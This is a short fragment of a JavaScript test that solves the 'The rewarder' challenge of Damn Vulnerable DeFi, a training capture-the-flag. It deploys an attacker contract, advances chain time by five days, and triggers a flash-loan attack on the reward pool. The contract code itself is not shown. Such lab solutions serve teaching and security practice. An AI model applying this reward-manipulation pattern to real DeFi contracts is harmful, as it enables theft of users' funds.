...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackRewarder = await ethers.getContractFactory('AttackRewarderPool', attacker);
        const hack = await AttackRewarder.deploy(this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address, this.liquidityToken.address);

        const fiveDays = 5 * 24 * 60 * 60;
        await ethers.provider.send('evm_increaseTime', [fiveDays]);
        await hack.connect(attacker).attack(TOKENS_IN_LENDER_POOL, { from: attacker.address });

        // Reference - https://iphelix.medium.com/damn-vulnerable-defi-challenge-5-walkthrough-2dd516735ad6
    });
